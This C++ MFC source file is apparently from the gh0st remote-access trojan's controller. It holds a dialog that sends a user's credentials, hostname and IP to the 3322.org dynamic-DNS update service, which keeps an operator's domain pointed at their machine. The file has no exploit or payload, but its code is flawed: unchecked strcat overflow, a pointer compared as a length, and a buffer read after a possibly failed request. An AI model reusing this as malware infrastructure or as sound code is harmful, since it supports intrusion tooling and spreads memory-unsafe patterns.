// GENGXIN.cpp : implementation file
//

#include "stdafx.h"
#include "gh0st.h"
#include "GENGXIN.h"
#include <wininet.h>

#ifdef _DEBUG
#define new DEBUG_NEW
#undef THIS_FILE
static char THIS_FILE[] = __FILE__;
#endif

/////////////////////////////////////////////////////////////////////////////
// CGENGXIN dialog


CGENGXIN::CGENGXIN(CWnd* pParent /*=NULL*/)
	: CDialog(CGENGXIN::IDD, pParent)
{
	//{{AFX_DATA_INIT(CGENGXIN)
		// NOTE: the ClassWizard will add member initialization here
	//}}AFX_DATA_INIT
}


void CGENGXIN::DoDataExchange(CDataExchange* pDX)
{
	CDialog::DoDataExchange(pDX);
	//{{AFX_DATA_MAP(CGENGXIN)
		// NOTE: the ClassWizard will add DDX and DDV calls here
	//}}AFX_DATA_MAP
}


BEGIN_MESSAGE_MAP(CGENGXIN, CDialog)
	//{{AFX_MSG_MAP(CGENGXIN)
	ON_BN_CLICKED(IDC_BUTTON1, OnButton1)
	//}}AFX_MSG_MAP
END_MESSAGE_MAP()

/////////////////////////////////////////////////////////////////////////////
// CGENGXIN message handlers



void CGENGXIN::OnButton1() 
{
	// TODO: Add your control notification handler code here
	CString id,pass,dns,ip; 
	char a[256]="http://";
	char *b = "@members.3322.org/dyndns/update?system=dyndns&hostname=";
	char *c = "&myip=";
	char *d = "&wildcard=OFF";
    GetDlgItem(IDC_DNSID)->GetWindowText(id);
	GetDlgItem(IDC_DNSPASS)->GetWindowText(pass);
	GetDlgItem(IDC_DNS)->GetWindowText(dns);
	GetDlgItem(IDC_IP)->GetWindowText(ip);
    USES_CONVERSION;
	strcat(a, W2A(id));
	strcat(a,":");
    strcat(a, W2A(pass));
	strcat(a,b);
    strcat(a, W2A(dns));
	strcat(a,c);
	strcat(a,W2A(ip));
	strcat(a,d);

	//	 MessageBox(a);
	//"http://xxxx:xxxxx@members.3322.org/dyndns/update?system=dyndns&hostname=xxxxx.3322.org&myip=192.168.0.1&wildcard=OFF"; 

	HINTERNET hNet = ::InternetOpen(_T("3322"), //当HTTP协议使用时，这个参数随意赋值 
									PRE_CONFIG_INTERNET_ACCESS, //访问类型指示Win32网络函数使用登记信息去发现一个服务器。 
									NULL, 
									INTERNET_INVALID_PORT_NUMBER, //使用INTERNET_INVALID_PORT_NUMBER相当于提供却省的端口数。 
									0); //标志去指示使用返回句句柄的将来的Internet函数将"不"为回调函数发送状态信息 
	
	HINTERNET hUrlFile = ::InternetOpenUrl(hNet, //从InternetOpen返回的句柄 
											A2W(a), //需要打开的URL 
											NULL, //用来向服务器传送额外的信息,一般为NULL 
											0, //用来向服务器传送额外的信息,一般为 0 
											INTERNET_FLAG_RELOAD, //InternetOpenUrl行为的标志 
											0) ; //信息将不会被送到状态回调函数 
	
	char buffer[1024] ; 
	DWORD dwBytesRead = 0; 
	BOOL bRead = ::InternetReadFile(hUrlFile, //InternetOpenUrl返回的句柄 
									buffer, //保留数据的缓冲区 
									sizeof(buffer), 
									&dwBytesRead); //指向包含读入缓冲区字节数的变量的指针; 
	//如果返回值是TRUE，而且这里指向0，则文件已经读到了文件的末尾。 
	InternetCloseHandle(hUrlFile) ; 
	InternetCloseHandle(hNet) ; 

    if(buffer>0)
	{
        if(strstr(buffer,"badauth"))
			MessageBox(_T("用户名/密码错误!"));
		if(strstr(buffer,"good"))
			MessageBox(_T("更新域名成功!\r\n")+ip);
		if(strstr(buffer,"nohost"))
			MessageBox(_T("域名错误!\n\r Check again!"));
		if(strstr(buffer,"nochg"))
			MessageBox(_T("over update"));
	}
	memset(buffer,0,sizeof(buffer));
}

BOOL CGENGXIN::OnInitDialog() 
{
	CDialog::OnInitDialog();
	
	// TODO: Add extra initialization here
	WSADATA wsaData;
	WSAStartup(MAKEWORD(2,2),&wsaData);
	char szhostname[128];
    CStringA str;
	if( gethostname(szhostname, 128) == 0 )
	{
		struct hostent * phost;
		int i=0,j,h_length=4;
		phost = gethostbyname(szhostname);
		for( j = 0; j<h_length; j++ )
		{
			CStringA addr;			
			if( j > 0 )
				str += ".";			
			addr.Format("%u", (unsigned int)((unsigned char*)phost->h_addr_list[i])[j]);
			str += addr;
		}
	}
    USES_CONVERSION;
	GetDlgItem(IDC_IP)->SetWindowText(A2W(str));
	return TRUE;  // return TRUE unless you set the focus to a control
	              // EXCEPTION: OCX Property Pages should return FALSE
}
